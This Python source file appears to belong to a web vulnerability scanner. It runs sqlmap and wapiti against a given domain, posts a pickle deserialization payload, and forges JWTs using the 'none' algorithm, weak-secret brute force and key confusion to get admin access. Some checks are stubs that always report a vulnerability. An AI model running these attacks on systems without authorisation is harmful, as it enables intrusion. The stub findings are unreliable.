import requests
import jwt
import json
import base64
from datetime import datetime
import logging
from urllib.parse import urljoin, urlparse
import re
import time

logger = logging.getLogger(__name__)

# import requests 
# import time
import threading
from app.services.scanner import analyze_url_and_collect_logs
from app.services.path_traversal import check_path_traversal
from app.utils.call_llm import call_llm
from app.utils.get_user import get_user
from app.utils.reports import save_report
# import json
import pickle
# import base64

import tempfile
import os
import subprocess
# import json

from app.services.csrf_scanner import scan_csrf_vulnerability

from app.services.file_upload import check_file_upload


from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib import colors
import os
from datetime import datetime

from app.services.cmd_injection import check_cmd_injection

class DomainService:

    supported_attacks = {
        #"Cross-Site Scripting": "Cross-Site Scripting",
        "sql_injection": "SQL Injection",
        "cmd_injection": "Command Injection",
        "jwt_vulnerabilities": "JWT Vulnerabilities",
        "path_traversal": "Path Traversal",
        #"csrf":"CSRF",
        "path_traversal":"Path Traversal",
        "insecure_deserialization":"Insecure Deserialization",
        #"command_injection":"Command Injection",
        "jwt":"JWT Manipulation",
        "ddos":"DDoS Attacks",
        "file_upload": "File Upload",
        "IP Scratching": "IP Scratching"
        # Add more attack types here
    }
    


    # Store scan results temporarily (in production, use database)
    scan_results_cache = {}

    @staticmethod
    def _trim_logs_for_llm(attack_type, raw_logs, max_non_vuln=3, max_chars=500):
        def trunc(x):
            return x if not isinstance(x, str) or len(x) <= max_chars else x[:max_chars] + "...[truncated]"

        def summarise(item):
            if isinstance(item, dict):
                return {k: summarise(v) for k, v in list(item.items())[:15]}
            if isinstance(item, list):
                return [summarise(x) for x in item[:max_non_vuln]]
            return trunc(item)

        if isinstance(raw_logs, dict) and "detailed_logs" in raw_logs:
            logs = raw_logs["detailed_logs"]
            vuln = [summarise(l) for l in logs if isinstance(l, dict) and l.get("vulnerable")]
            nonv = [summarise(l) for l in logs if not (isinstance(l, dict) and l.get("vulnerable"))][:max_non_vuln]
            out = {k: summarise(v) for k, v in raw_logs.items() if k != "detailed_logs"}
            out["detailed_logs_trimmed"] = vuln + nonv
            out["detailed_logs_count"] = len(logs)
            return out

        if isinstance(raw_logs, dict):
            return {k: summarise(v) for k, v in list(raw_logs.items())[:15]}

    # Handle list
        if isinstance(raw_logs, list):
            return [summarise(x) for x in raw_logs[:max_non_vuln]]
        
        return trunc(str(raw_logs))


    @staticmethod
    def scan_domain(domain, attacks, vuln_endpoint, upload_endpoint):
        results = {}

        for attack in attacks:
            print(attack)
            if attack == "Cross-Site Scripting":
                results['Cross-Site Scripting'] = DomainService.check_xss(domain)
            elif attack == "sql_injection":
                results['sql_injection'] = DomainService.check_sql_injection(domain)
            elif attack == "cmd_injection":
                results['cmd_injection'] = check_cmd_injection(domain) 
            elif attack == "jwt_vulnerabilities":
                results['jwt_vulnerabilities'] = DomainService.check_jwt_vulnerabilities(domain)
            elif attack == "IP Scratching":
                results['IP Scratching'] = analyze_url_and_collect_logs(domain)
            elif attack == "csrf":
                results['csrf'] = DomainService.check_csrf(domain) 
            # elif attack == "path_traversal":
            #     results['path_traversal'] = DomainService.check_path_traversal(domain) 
            elif attack == "insecure_deserialization":
                results['insecure_deserialization'] = DomainService.check_insecure_deserialization(domain) 
            # elif attack == "command_injection":
            #     results['command_injection'] = DomainService.check_command_injection(domain) 
            elif attack == "jwt":
                results['jwt'] = DomainService.check_jwt(domain) 
            elif attack == "ddos":
                results['ddos'] = DomainService.check_ddos(domain) 
            elif attack == "file_upload":
                results['file_upload'] = check_file_upload(domain, upload_endpoint)
            elif attack == "path_traversal":
                results['path_traversal'] = check_path_traversal(domain, vuln_endpoint) 
            # Add more attack types here
            else:
                results[attack] = "Unknown attack type"

            for key, value in results.items():
                print(f"{key} result:")
                print(json.dumps(value, indent=4))
                print() 


        llm_results = json.loads(json.dumps(results, default=str))

        for attack_type in llm_results.keys():
            llm_results[attack_type] = DomainService._trim_logs_for_llm(attack_type, llm_results[attack_type])


        numOfvul = len(results)
        DomainService.scan_results_cache[domain] = {
             "domain": domain, 
             "results": results, # ORIGINAL, untrimmed results
             "timestamp": datetime.now().isoformat()
        }
        
        scan_data = {
            "domain": domain, 
            "results": llm_results, 
            "timestamp": datetime.now().isoformat()
        }
        
        llm_response = call_llm(scan_data)
        user_id = get_user()

        print("[REPORT INSERT] user_id=", user_id)
        
        report_doc = {
            "user_id": user_id, 
            "website": domain,
            "tags": list(results.keys()),
            "report": llm_response,
            "created_at": datetime.now().timestamp()
        }
        
        save_report(report_doc)
        return {"result" :DomainService.scan_results_cache[domain], "llm_response": llm_response}


    @staticmethod
    def check_xss(domain):
        with tempfile.TemporaryDirectory() as tmpdir:
            report_path = os.path.join(tmpdir, "xss_report.json")
            try:
                # we are using a subservice to run the command and then storing the result on temp path in a temp json file
                command = [
                    'wapiti',
                    '-u', domain, #used to specify domain on which attack is being done, taken as parameter
                    '--module', 'xss', #used to specify which type of attack to be done
                    '--level', '2', #used to specify level of attack              
                    '-f', 'json', 
                    '-o', report_path, #used to specify path at which report is created
                    '-v', '2' #used to specify verbose of the attack (level of detail)
                    #higher levels of verbose and level will slow down o/p of subprocess                   
                ]
                result = subprocess.run(
                    command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    timeout=180,
                    encoding='utf-8', #some issue was coming in encoding in a specific test and so had to use utf-8
                    errors='replace'
                )

                if os.path.exists(report_path):
                    with open(report_path, 'r') as f:
                        report = json.load(f)
                        result = report.get("vulnerabilities", {}).get("Reflected Cross Site Scripting", "No XSS issues found")
                        return result
                        
                else:
                    return f"No XSS report generated.\nOutput:\n{result.stdout}\nErrors:\n{result.stderr}"

            except subprocess.TimeoutExpired:
                return "Wapiti XSS scan timed out"
            except Exception as e:
                return f"Error during Wapiti XSS scan: {str(e)}"


    @staticmethod
    def check_sql_injection(domain):
        """Run SQLMap locally via CLI instead of API"""
        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                report_path = os.path.join(tmpdir, "sqlmap_report.txt")
                command = [
                    "sqlmap",
                    "-u", domain,
                    "--batch",
                    "--crawl=3",
                    "--random-agent",
                    "--threads=5",
                    "--risk=2",
                    "--output-dir", tmpdir
                ]

                process = subprocess.Popen(
                    command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    encoding="utf-8",
                    errors="replace"
                )

                try:
                    stdout, stderr = process.communicate(timeout=300)
                except subprocess.TimeoutExpired:
                    process.kill()
                    return {"status": "error", "error": "SQLMap scan timed out"}

                output = (stdout or "") + "\n" + (stderr or "")
                output_lower = output.lower()

                if ("no parameter(s) found for testing" in output_lower) or ("no usable links found" in output_lower):
                    result = "NO VULNERABILITIES FOUND"
                else:
                    result = "THERE ARE VULNERABILITIES"

                return {
                    "status": "completed",
                    "result": result,
                    "response": output.strip()
                }

        except Exception as e:
            logger.error(f"SQL Injection check failed: {str(e)}")
            return {"error": str(e), "status": "error"}
    
    @staticmethod
    def check_jwt_vulnerabilities(domain):
        """Check JWT vulnerabilities for the given domain"""
        try:
            tester = JWTVulnerabilityTester()
            # Ensure proper URL format
            if not domain.startswith(('http://', 'https://')):
                domain = 'https://' + domain
            
            results = tester.test_url(domain, include_brute_force=False)
            return results
        except Exception as e:
            logger.error(f"Error testing JWT vulnerabilities for {domain}: {e}")
            return {"error": f"Failed to test JWT vulnerabilities: {str(e)}"}
    
    
    @staticmethod
    def check_insecure_deserialization(domain):

        test_results = {}

        # Payload: harmless but detectable on server
        class TestPayload:
            def __reduce__(self):
                return (print, ("[!] Deserialization Triggered",))

        payload = pickle.dumps(TestPayload())
        encoded_payload = base64.b64encode(payload).decode()

        try:
            # Send payload as part of a cookie, header, or POST param
            headers = {'Content-Type': 'application/octet-stream'}
            r = requests.post(domain, data=payload, headers=headers, timeout=5)

            # Logic for attack detection
            if r.status_code == 500 or "[!]" in r.text:
                test_results['status'] = 'Possible vulnerability detected'
            else:
                test_results['status'] = 'No obvious vulnerability'

        except requests.exceptions.RequestException as e:
            test_results['error'] = str(e)

        return test_results
    
    
    @staticmethod
    def check_csrf(domain):
        return scan_csrf_vulnerability(domain)

    # @staticmethod
    # def check_path_traversal(domain):
    #     # Mock logic for path traversal vulnerability
    #     return "Potential path traversal vulnerability found"
    
    @staticmethod
    def check_command_injection(domain):
        # Mock logic for command injection vulnerability
        return "Potential command injection vulnerability found"
    
    @staticmethod
    def check_jwt(domain):
        # Mock logic for jwt vulnerability
        return "Potential jwt vulnerability found"
    
    @staticmethod
    def check_file_upload(domain):
        # Mock logic for file_upload vulnerability
        return "Potential file_upload vulnerability found"

    @staticmethod
    def check_ddos(domain):
        # Mock logic for ddos vulnerability
        return "Potential ddos vulnerability found" 

    @classmethod
    def get_supported_attacks(cls):
        return cls.supported_attacks
    
    @staticmethod
    def generate_pdf_report(domain):
        scan_data = DomainService.scan_results_cache.get(domain)
        if not scan_data:
            raise Exception("No scan data found for this domain")
        pdf_dir = "static/reports"
        os.makedirs(pdf_dir, exist_ok=True)
    
        # Generate PDF filename
        safe_domain = domain.replace('/', '_').replace(':', '_')
        pdf_filename = f"{safe_domain}_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
        pdf_path = os.path.join(pdf_dir, pdf_filename)
    
        # Create PDF
        doc = SimpleDocTemplate(pdf_path, pagesize=letter)
        styles = getSampleStyleSheet()
        story = []
    
        # Title
        title_style = ParagraphStyle(
        'CustomTitle',
        parent=styles['Heading1'],
        fontSize=24,
        spaceAfter=30,
        textColor=colors.darkblue
        )
        story.append(Paragraph("Vulnora Security Report", title_style))
        story.append(Spacer(1, 20))
    
        # Domain info
        story.append(Paragraph(f"<b>Domain:</b> {scan_data['domain']}", styles['Normal']))
        story.append(Paragraph(f"<b>Scan Date:</b> {scan_data['timestamp']}", styles['Normal']))
        story.append(Spacer(1, 20))
    
        # Results section
        story.append(Paragraph("Vulnerability Scan Results", styles['Heading2']))
        story.append(Spacer(1, 12))

        for attack_type, result in scan_data['results'].items():
            attack_name = DomainService.supported_attacks.get(attack_type, attack_type.replace('_', ' ').title())
            story.append(Paragraph(f"<b>{attack_name}:</b>", styles['Heading3']))

            # Convert result to string safely
            if isinstance(result, dict) or isinstance(result, list):
                from html import escape
                import json
                result_str = json.dumps(result, indent=2)
                result_str = escape(result_str).replace('\n', '<br/>').replace(' ', '&nbsp;')
            else:
                result_str = str(result)

            story.append(Paragraph(result_str, styles['Normal']))
            story.append(Spacer(1, 12))
    
        doc.build(story)

        # Return the API download URL
        return f"http://localhost:5001/api/download/{pdf_filename}"

class JWTVulnerabilityTester:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        # Common weak secrets
        self.weak_secrets = [
            'secret', 'password', '123456', 'admin', 'test', 'key', 'jwt', 'token', 
            'auth', 'user', 'default', 'qwerty', 'your-256-bit-secret', 'secretkey',
            'jwtsecret', 'mysecret', 'supersecret', 'topsecret', 'changeme',
            'password123', '12345678', 'abcdef', 'letmein', 'welcome',
            '', 'null', 'undefined', 'none', '0', '1', 'true', 'false'
        ]

    def _safe_text_snippet(self, text, length=300):
        """Utility to trim and clean response text for logging."""
        if not text:
            return ""
        return text[:length].replace('\n', ' ').strip()
    
    def extract_jwt_from_response(self, response):
        """Extract JWT tokens from response headers and body"""
        tokens = []
        
        # Check Authorization header
        auth_header = response.headers.get('Authorization', '')
        if auth_header.startswith('Bearer '):
            tokens.append(auth_header.split(' ')[1])
        
        # Check Set-Cookie headers for JWT patterns
        cookies = response.headers.get('Set-Cookie', '')
        if cookies:
            jwt_pattern = r'[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}'
            found_tokens = re.findall(jwt_pattern, cookies)
            tokens.extend(found_tokens)
        
        # Check response body for JWT patterns
        try:
            if response.text:
                jwt_pattern = r'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
                found_tokens = re.findall(jwt_pattern, response.text)
                # Additional validation - JWTs should be at least 50 chars
                valid_tokens = [t for t in found_tokens if len(t) > 50 and t.count('.') == 2]
                tokens.extend(valid_tokens)
        except:
            pass
        
        return list(set(tokens))
    
    def scan_common_endpoints(self, base_url):
        """Scan common endpoints that might return JWTs"""
        endpoints = [
            '/', '/home', '/dashboard', '/profile', '/user', '/admin',
            '/api', '/api/user', '/api/profile', '/api/me', '/me',
            '/api/v1/user', '/v1/user', '/health', '/status'
        ]
        
        tokens = []
        endpoint_results = []
        
        for endpoint in endpoints:
            try:
                url = urljoin(base_url, endpoint)
                response = self.session.get(url, timeout=10)
                found_tokens = self.extract_jwt_from_response(response)
                tokens.extend(found_tokens)
                
                endpoint_results.append({
                    'endpoint': endpoint,
                    'status': response.status_code,
                    'tokens_found': len(found_tokens)
                })
                
            except Exception:
                continue
        
        return list(set(tokens)), endpoint_results
    
    def decode_jwt_header(self, token):
        """Decode JWT header without verification"""
        try:
            header = jwt.get_unverified_header(token)
            return header
        except Exception as e:
            logger.error(f"Error decoding JWT header: {e}")
            return None
    
    def decode_jwt_payload(self, token):
        """Decode JWT payload without verification"""
        try:
            payload = jwt.decode(token, options={"verify_signature": False})
            return payload
        except Exception as e:
            logger.error(f"Error decoding JWT payload: {e}")
            return None
    
    def test_none_algorithm(self, token, target_url):
        """Test if server accepts 'none' algorithm"""
        
        # Initialize dictionary to hold results, including new fields
        vuln_details = {
            'is_vuln': False,
            'msg': "Server properly rejects 'none' algorithm",
            'status_code': None,
            'snippet': ''
        }
        
        try:
            payload = self.decode_jwt_payload(token)
            if not payload:
                vuln_details['msg'] = "Could not decode original token"
                return vuln_details
            
            # Modify payload to be more convincing (admin privileges)
            test_payload = payload.copy()
            if 'role' in test_payload:
                test_payload['role'] = 'admin'
            if 'admin' in test_payload:
                test_payload['admin'] = True
            
            # Create token with 'none' algorithm
            header = {"alg": "none", "typ": "JWT"}
            
            # Create unsigned token
            header_b64 = base64.urlsafe_b64encode(
                json.dumps(header, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(test_payload, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            none_token = f"{header_b64}.{payload_b64}."
            
            # Test multiple endpoints
            test_endpoints = ['/', '/profile', '/admin', '/dashboard', '/api/user']
            
            for endpoint in test_endpoints:
                test_url = urljoin(target_url, endpoint)
                
                # Test with Authorization header
                response = self.session.get(
                    test_url,
                    headers={'Authorization': f'Bearer {none_token}'},
                    timeout=10
                )
                
                # Update status and snippet regardless of success, capturing the last attempt
                vuln_details['status_code'] = response.status_code
                vuln_details['snippet'] = self._safe_text_snippet(response.text)
                
                if response.status_code in [200, 201, 202] and 'error' not in response.text.lower():
                    vuln_details['is_vuln'] = True
                    vuln_details['msg'] = f"Server accepts 'none' algorithm at {endpoint}"
                    return vuln_details # Return immediately on successful detection
                
            
            return vuln_details
            
        except Exception as e:
            vuln_details['msg'] = f"Error testing 'none' algorithm: {e}"
            return vuln_details
    
    def test_weak_secret(self, token, target_url):
        """Test common weak secrets"""
        
        # Initialize dictionary to hold results, including new fields
        vuln_details = {
            'is_vuln': False,
            'msg': "No weak secrets found",
            'status_code': None,
            'snippet': ''
        }
        
        try:
            original_payload = self.decode_jwt_payload(token)
            if not original_payload:
                vuln_details['msg'] = "Could not decode original token"
                return vuln_details
            
            # Create a modified payload for testing
            test_payload = original_payload.copy()
            if 'role' in test_payload:
                test_payload['role'] = 'admin'
            if 'admin' in test_payload:
                test_payload['admin'] = True
            
            for secret in self.weak_secrets:
                try:
                    # Create new token with weak secret
                    new_token = jwt.encode(test_payload, secret, algorithm='HS256')
                    
                    # Test multiple endpoints
                    test_endpoints = ['/', '/profile', '/admin', '/dashboard', '/api/user']
                    
                    for endpoint in test_endpoints:
                        test_url = urljoin(target_url, endpoint)
                        
                        response = self.session.get(
                            test_url,
                            headers={'Authorization': f'Bearer {new_token}'},
                            timeout=10
                        )
                        
                        # Update status and snippet regardless of success, capturing the last attempt
                        vuln_details['status_code'] = response.status_code
                        vuln_details['snippet'] = self._safe_text_snippet(response.text)
                        
                        if response.status_code in [200, 201, 202] and 'error' not in response.text.lower():
                            vuln_details['is_vuln'] = True
                            vuln_details['msg'] = f"Weak secret found: '{secret}' (endpoint: {endpoint})"
                            return vuln_details # Return immediately on successful detection
                            
                except Exception:
                    continue
            
            return vuln_details
            
        except Exception as e:
            vuln_details['msg'] = f"Error testing weak secrets: {e}"
            return vuln_details
    
    def test_key_confusion(self, token, target_url):
        """Test RS256 to HS256 key confusion"""
        
        # Initialize dictionary to hold results, including new fields
        vuln_details = {
            'is_vuln': False,
            'msg': "No key confusion vulnerability detected",
            'status_code': None,
            'snippet': ''
        }
        
        try:
            header = self.decode_jwt_header(token)
            payload = self.decode_jwt_payload(token)
            
            if not header or not payload:
                vuln_details['msg'] = "Could not decode token"
                return vuln_details
            
            if header.get('alg') != 'RS256':
                vuln_details['msg'] = "Token is not RS256 (skipping key confusion test)"
                return vuln_details
            
            # Common public key patterns to try
            test_keys = [
                "-----BEGIN PUBLIC KEY-----",
                "public",
                "key",
                "rsa",
                "publickey"
            ]
            
            for key in test_keys:
                try:
                    # Create HS256 token using potential public key as secret
                    confused_token = jwt.encode(payload, key, algorithm='HS256')
                    
                    test_endpoints = ['/profile', '/admin', '/dashboard', '/api/user']
                    
                    for endpoint in test_endpoints:
                        test_url = urljoin(target_url, endpoint)
                        
                        response = self.session.get(
                            test_url,
                            headers={'Authorization': f'Bearer {confused_token}'},
                            timeout=10
                        )
                        
                        # Update status and snippet regardless of success, capturing the last attempt
                        vuln_details['status_code'] = response.status_code
                        vuln_details['snippet'] = self._safe_text_snippet(response.text)
                        
                        if response.status_code in [200, 201, 202]:
                            vuln_details['is_vuln'] = True
                            vuln_details['msg'] = f"Possible key confusion vulnerability (key: {key[:20]}...)"
                            return vuln_details # Return immediately on successful detection
                            
                except Exception:
                    continue
            
            return vuln_details
            
        except Exception as e:
            vuln_details['msg'] = f"Error testing key confusion: {e}"
            return vuln_details
    
    def test_url(self, url, include_brute_force=False):
        """Main testing function"""
        results = {
            'url': url,
            'timestamp': datetime.now().isoformat(),
            'jwt_found': False,
            'vulnerabilities': [],
            'tokens_analyzed': 0,
            'discovery_methods': [],
            'endpoint_scan': []
        }
        
        try:
            logger.info(f"Starting JWT scan for: {url}")
            
            # Scan common endpoints
            tokens, endpoint_results = self.scan_common_endpoints(url)
            results['endpoint_scan'] = endpoint_results
            if tokens:
                results['discovery_methods'].append('endpoint_scanning')
            
            # Remove duplicates
            tokens = list(set(tokens))
            results['tokens_analyzed'] = len(tokens)
            
            if not tokens:
                results['message'] = "No JWT tokens discovered through scanning"
                return results
            
            results['jwt_found'] = True
            logger.info(f"Found {len(tokens)} JWT tokens")
            
            # Analyze each token found
            for i, token in enumerate(tokens):
                logger.info(f"Analyzing token {i+1}/{len(tokens)}")
                
                # Test 'none' algorithm vulnerability
                none_result = self.test_none_algorithm(token, url)
                if none_result['is_vuln']:
                    results['vulnerabilities'].append({
                        'type': 'none_algorithm',
                        'severity': 'CRITICAL',
                        'description': none_result['msg'],
                        'status_code': none_result['status_code'], # <-- NEW FIELD
                        'snippet': none_result['snippet'],  # <-- NEW FIELD
                        'token_sample': token[:50] + '...'
                    })
                
                # Test weak secret vulnerability
                weak_secret_result = self.test_weak_secret(token, url)
                if weak_secret_result['is_vuln']:
                    results['vulnerabilities'].append({
                        'type': 'weak_secret',
                        'severity': 'HIGH', 
                        'description': weak_secret_result['msg'],
                        'status_code': weak_secret_result['status_code'], # <-- NEW FIELD
                        'snippet': weak_secret_result['snippet'],  # <-- NEW FIELD
                        'token_sample': token[:50] + '...'
                    })
                
                # Test key confusion vulnerability
                key_confusion_result = self.test_key_confusion(token, url)
                if key_confusion_result['is_vuln']:
                    results['vulnerabilities'].append({
                        'type': 'key_confusion',
                        'severity': 'MEDIUM',
                        'description': key_confusion_result['msg'],
                        'status_code': key_confusion_result['status_code'], # <-- NEW FIELD
                        'snippet': key_confusion_result['snippet'], # <-- NEW FIELD
                        'token_sample': token[:50] + '...'
                    })
            
            if not results['vulnerabilities']:
                results['message'] = "JWT tokens found but no vulnerabilities detected"
            else:
                results['message'] = f"Found {len(results['vulnerabilities'])} JWT vulnerabilities"
            
            return results
            
        except requests.RequestException as e:
            results['error'] = f"Network error: {e}"
            return results
        except Exception as e:
            results['error'] = f"Unexpected error: {e}"
            return results